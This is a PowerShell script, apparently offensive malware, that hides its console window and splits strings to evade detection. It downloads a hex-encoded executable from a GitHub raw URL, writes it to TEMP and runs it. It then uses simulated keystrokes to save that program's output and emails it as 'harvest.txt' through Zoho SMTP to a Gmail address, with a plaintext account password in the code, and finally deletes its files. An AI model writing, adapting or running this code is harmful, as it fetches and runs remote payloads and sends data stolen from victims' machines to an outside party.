# --- 0. START DIAGNOSTIC LOGGING ---
$v_log = "$env:TEMP\debug_$(Get-Random).txt"
Start-Transcript -Path $v_log -Append

try {
    # --- 1. WINDOW HIDER (Standardized for Lab) ---
    $v_ms = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
    $v_type = Add-Type -MemberDefinition $v_ms -Name "W32S" -Namespace "W3" -PassThru
    $v_type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

    # --- 2. THE SMTP FRAGMENTATION ---
    $v_sc = "Net.M" + "ail.Smtp" + "Client"
    $v_mm = "Net.M" + "ail.Mail" + "Message"

    function Send-V-Mail {
        param($sb, $at)
        $u = "zqrvstef0rc5edk@zohomail.com"
        $p = "LHjzKTbzDApt" # Must be Zoho App Password

        $m = New-Object $v_mm
        $m.From = "Ang Mangagawa <$u>"
        $m.To.Add("srve650@gmail.com")
        $m.Subject = $sb
        $m.Body = "Lab Data."
        if ($at) { $m.Attachments.Add($at) }

        $c = New-Object $v_sc("smtp.zoho.com", 587)
        $c.EnableSsl = $true
        $c.Credentials = New-Object System.Net.NetworkCredential($u, $p)
        $c.Send($m)
        $m.Dispose(); $c.Dispose()
    }

    # --- 3. DOWNLOAD & CONVERT ---
    $u_url = "ht" + "tps://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"
    $r_nm = -join ((97..122) | Get-Random -Count 5 | % {[char]$_})
    $v_txt = "$env:TEMP\$r_nm.txt"
    $v_exe = "$env:TEMP\$r_nm.exe"

    Invoke-WebRequest -Uri $u_url -OutFile $v_txt

    $h_data = Get-Content $v_txt -Raw
    $b_data = [byte[]]::new($h_data.Length / 2)
    for ($i = 0; $i -lt $h_data.Length; $i += 2) {
        $b_data[$i / 2] = [convert]::ToByte($h_data.Substring($i, 2), 16)
    }
    [System.IO.File]::WriteAllBytes($v_exe, $b_data)

    # --- 4. EXECUTION & KEYS ---
    $v_p = Start-Process $v_exe -PassThru
    $v_out = "$env:TEMP\ani_$r_nm.log"

    Start-Sleep -Seconds 4 # Extra time for app to load
    Add-Type -AssemblyName "System.Win" + "dows.Forms"
    
    [System.Windows.Forms.SendKeys]::SendWait("^(a)")
    Start-Sleep -Milliseconds 500
    [System.Windows.Forms.SendKeys]::SendWait("^(s)")
    Start-Sleep -Seconds 1
    [System.Windows.Forms.SendKeys]::SendWait("$v_out")
    Start-Sleep -Milliseconds 500
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
    Start-Sleep -Seconds 2

    # --- 5. EXFIL & CLEANUP ---
    if ($v_p) { Stop-Process -Id $v_p.Id -Force }
    
    if (Test-Path $v_out) {
        $r_raw = Get-Content $v_out -Raw
        $ms = New-Object System.IO.MemoryStream
        $sw = New-Object System.IO.StreamWriter($ms)
        $sw.Write($r_raw); $sw.Flush(); $ms.Position = 0
        $v_at = New-Object Net.Mail.Attachment($ms, "harvest.txt")
        
        Send-V-Mail -sb "Ani_$r_nm" -at $v_at
        $v_at.Dispose()
    }

    # Final Deletion
    Remove-Item $v_txt, $v_exe, $v_out -Force
}
catch {
    # If anything fails, it will be in the Transcript
    Write-Warning "Critical Error: $($_.Exception.Message)"
}
finally {
    Stop-Transcript
    # Note: I removed the self-destruct so you can read the debug_log.txt first!
}